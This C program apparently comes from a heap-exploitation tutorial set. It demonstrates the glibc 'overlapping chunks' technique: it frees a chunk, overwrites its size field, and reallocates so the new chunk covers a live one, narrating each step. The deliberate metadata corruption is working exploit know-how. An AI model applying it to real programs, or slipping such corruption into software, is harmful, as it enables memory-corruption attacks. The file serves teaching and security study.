/*

 A simple tale of overlapping chunk.
 This technique is taken from 
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){


	intptr_t *p1,*p2,*p3,*p4;

	printf("\nThis is a simple chunks overlapping problem\n\n");
	printf("Let's start to allocate 3 chunks on the heap\n");
	
	p1 = malloc(100);
	p2 = malloc(100);
	p3 = malloc(80);

	printf("The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	strcpy((char*)p1, "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111");
	strcpy((char*)p2, "222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222");
	strcpy((char*)p3, "3333333333333333333333333333333333333333333333333333333333333333333333333333333");

	printf("\nNow let's free the chunk p2\n");
	free(p2);
	printf("The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	printf("Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	printf("The size must have the last 3 bits set to 0, as these are flags\nthat represent this chunk being free.\n");

	int evil_chunk_size = 248;
	int evil_region_size = 248 - 2*sizeof(intptr_t);
	printf("We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n", evil_chunk_size, evil_region_size);

 	*(p2-1) = 248; // we are overwriting the "size" field of chunk p2

	printf("\nNow let's allocate another chunk with a size equal to the data\nsize of the chunk p2 injected size\n");
	printf("This malloc will be served from the previously freed chunk that\nis parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	printf("\np4 has been allocated at %p and ends at %p\n", p4, p4+evil_region_size);
	printf("p3 starts at %p and ends at %p\n", p3, p3+80);
	printf("p4 should overlap with p3, in this case p4 includes all p3.\n");

	printf("\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3, and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	printf("Let's run through an example. Right now, we have:\n");
	printf("p4 = %.240s\n", (char *)p4);
	printf("p3 = %.80s\n", (char *)p3);
			
	printf("\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %.240s\n", (char *)p4);
	printf("p3 = %.80s\n", (char *)p3);

	printf("\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	printf("p4 = %.240s\n", (char *)p4);
	printf("p3 = %.80s\n", (char *)p3);
}


